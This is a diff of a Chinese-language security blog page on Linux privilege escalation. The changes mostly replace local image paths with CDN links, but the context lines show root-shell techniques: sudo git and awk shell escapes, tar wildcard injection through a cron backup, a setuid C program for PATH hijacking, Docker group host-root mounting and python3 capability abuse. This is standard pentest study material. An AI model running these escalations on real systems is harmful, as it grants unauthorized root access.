@@ -23,16 +23,21 @@
 <meta property="og:site_name" content="Backk0m&#39;s Blog">
 <meta property="og:description" content="Linux提权写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章 1.漏洞提权2.suid提权SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限 12chmod u+s filename #设置suidchmod u-s filenam">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/158.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/159.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/160-1717158637642-3.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/161.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/162.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/163.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/164.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/165.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/166.png">
 <meta property="article:published_time" content="2024-06-01T09:04:54.000Z">
-<meta property="article:modified_time" content="2024-06-01T09:17:22.567Z">
+<meta property="article:modified_time" content="2024-06-03T08:46:10.227Z">
 <meta property="article:author" content="Backk0m">
 <meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/160-1717158637642-3.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/158.png">
   
   
   
@@ -236,7 +241,7 @@
         
         
         
-          39 分钟
+          38 分钟
         
       </span>
     
@@ -367,7 +372,7 @@
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">backkom <span class="hljs-built_in">ALL</span>=(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/awk<br>backk0m <span class="hljs-built_in">ALL</span>=(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/apt-get<br></code></pre></td></tr></table></figure>
 
 <p>允许用户 <code>backk0m</code> 在所有主机上无需密码以 <code>root</code> 身份运行 <code>/usr/bin/apt-get</code></p>
-<p>![](E:\Personal Notes\WEB\Drone aircraft\assets\158.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/158.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="git"><a href="#git" class="headerlink" title="git"></a>git</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1:</span><br>sudo git <span class="hljs-built_in">help</span> config<br>!/bin/bash<br><span class="hljs-comment">#2:</span><br>sudo git -p <span class="hljs-built_in">help</span><br>!/bin/bash<br></code></pre></td></tr></table></figure>
 
 <h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span>&#123;system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure>
@@ -396,7 +401,7 @@
 <p><code>-p</code> 参数的意思是向上继承，继承suid权限</p>
 <h4 id="通配符注入"><a href="#通配符注入" class="headerlink" title="通配符注入"></a>通配符注入</h4><p>linux中有很多通配符，和正则类似，例如tar一个目录，如果写*，就代表压缩当前目录下的所有文件，*代表一个或多个字符</p>
 <p>在操作过程中，如果有一个文件名的名字是一个参数，那么执行过程中，就会被当作参数运行，例如目录下有一个叫<code>--help</code>的文件，当cat查看该文件内容时，实际上是显示 cat的帮助信息</p>
-<p>![](E:\Personal Notes\WEB\Drone aircraft\assets\159.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/159.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们创建定时备份脚本 crontab.sh</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html/<br>tar -zvcf /var/backups/html.tar *<br></code></pre></td></tr></table></figure>
 
@@ -432,7 +437,7 @@
 <p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
 <h3 id="6-Path环境变量提权"><a href="#6-Path环境变量提权" class="headerlink" title="6.Path环境变量提权"></a>6.Path环境变量提权</h3><p>Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。</p>
 <p>可以执行env命令列出所有的环境变量，然后找到PATH，或者grep进行结果筛选，或者echo出$PATH值，命令如下。</p>
-<p>![](E:\Personal Notes\WEB\Drone aircraft\assets\163.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/163.png" srcset="/img/loading.gif" lazyload></p>
 <p>首先编译以下c代码，功能为调用id命令</p>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span>&lt;stdio<span class="hljs-selector-class">.h</span>&gt;<br>void <span class="hljs-selector-tag">main</span>()&#123;<br>	<span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">system</span>(&quot;whoami&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -464,7 +469,7 @@
 <p>注意点:如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p>
 <h3 id="8-Docker提权"><a href="#8-Docker提权" class="headerlink" title="8.Docker提权"></a>8.Docker提权</h3><p>在docker中，是允许访问root用户和docker组中的其它用户的</p>
 <p>首先以root身份把一个普通账号添加到docker组，这里是test用户。然后使用newgrp将root账号初始组切换为docker。</p>
-<p>![](E:\Personal Notes\WEB\Drone aircraft\assets\165.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/165.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们可以看到test已经在docker组中了</p>
 <p>随后使用docker run来允许alpine镜像，v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。</p>
 <p>这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root。</p>
@@ -480,7 +485,7 @@
 <p>home&#x2F;demo&#x2F;python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用</p>
 <p>setcap设置能力，getcap读取能力。</p>
 <p>getcap通过r参数来读取指定目录下有能力的程序。</p>
-<p>![](E:\Personal Notes\WEB\Drone aircraft\assets\166.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/166.png" srcset="/img/loading.gif" lazyload></p>
 <p>能力滥用导致的提权</p>
 <p>例如管理员要为python3程序设置超级权限给kali用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。</p>
 <p>因为root只想给kali用户的python3能力，所以这里是将程序复制到了kali用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力</p>
@@ -569,6 +574,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/06/03/Perfection-HTB/" title="Perfection(HTB)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Perfection(HTB)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
